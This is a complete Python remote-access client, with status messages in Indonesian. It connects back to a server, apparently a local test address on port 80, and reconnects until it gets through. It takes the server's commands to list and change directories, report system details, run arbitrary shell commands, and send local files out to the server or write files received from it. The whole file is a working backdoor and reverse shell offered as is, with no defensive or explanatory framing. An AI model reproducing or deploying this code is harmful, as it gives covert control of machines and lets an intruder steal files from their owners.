import socket, platform, os, subprocess, time

def sysinfo():
    u = platform.uname()
    ip = socket.gethostbyname(socket.gethostname())
    return f"{u.system} {u.release} | {u.node} | {ip}"

def handle(cmd):
    cmd = cmd.strip()
    if cmd == "pwd": return os.getcwd()
    elif cmd == "ls": return "\n".join(os.listdir())
    elif cmd.startswith("cd "):
        try: os.chdir(cmd[3:]); return f"Berpindah ke {os.getcwd()}"
        except: return "[!] Gagal pindah direktori"
    elif cmd == "whoami": return os.getlogin()
    elif cmd == "sysinfo": return sysinfo()
    elif cmd.startswith("shell "):
        try: return subprocess.check_output(cmd[6:], shell=True).decode()
        except: return "[!] Gagal eksekusi shell"
    elif cmd.startswith("download "):
        fn = cmd.split(" ",1)[1]
        try:
            with open(fn, "rb") as f: d = f.read()
            s.send(b"[FILE]")
            s.send(str(len(fn)).zfill(4).encode())
            s.send(fn.encode())
            s.send(d + b"[ENDFILE]")
            return f"[+] File dikirim: {fn}"
        except: return "[!] File tidak ditemukan"
    else:
        return "[?] Perintah tidak dikenali"

def connect():
    global s
    while True:
        try:
            s = socket.socket()
            s.connect(("127.0.0.1", 80))
            print("[*] Terhubung ke server... menunggu perintah.")
            while True:
                cmd = s.recv(1024).decode().strip()
                if cmd == "[SYSINFO]":
                    s.send(sysinfo().encode())
                elif cmd == "[UPLOAD]":
                    fnlen = int(s.recv(4).decode())
                    fn = s.recv(fnlen).decode()
                    data = b""
                    while True:
                        chunk = s.recv(1024)
                        if b"[ENDFILE]" in chunk:
                            data += chunk.split(b"[ENDFILE]")[0]
                            break
                        data += chunk
                    with open(fn, "wb") as f: f.write(data)
                else:
                    result = handle(cmd)
                    s.send(result.encode())
        except:
            print("[!] Koneksi gagal. Mencoba ulang dalam 5 detik...")
            time.sleep(5)

if __name__ == "__main__":
    connect()